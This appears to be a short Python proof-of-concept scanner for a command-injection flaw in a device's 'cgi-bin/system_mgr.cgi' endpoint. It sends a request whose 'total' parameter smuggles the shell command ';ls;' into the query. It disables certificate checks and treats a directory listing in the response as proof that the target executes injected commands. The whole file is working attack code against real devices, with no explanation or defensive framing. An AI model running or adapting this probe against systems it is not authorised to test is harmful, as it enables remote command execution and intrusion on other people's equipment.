import requests,re,urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def randomLowercase(n):
	key=""
	zf="qwertyuiopasdfghjklzxcvbnm"
	import random
	for _ in range(n):
		suiji1=random.randint(0,len(zf)-1)
		key+=zf[suiji1]
	return key
r1=randomLowercase(8)
def scan(baseurl):
	if baseurl[-1]=='/':
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"cgi-bin/system_mgr.cgi?cmd=cgi_get_log_item&total=;ls;"
	response=requests.get(url,verify=False,timeout=5)
	if 'system_mgr.cgi' in response.text:
		return True
	else:
		return False
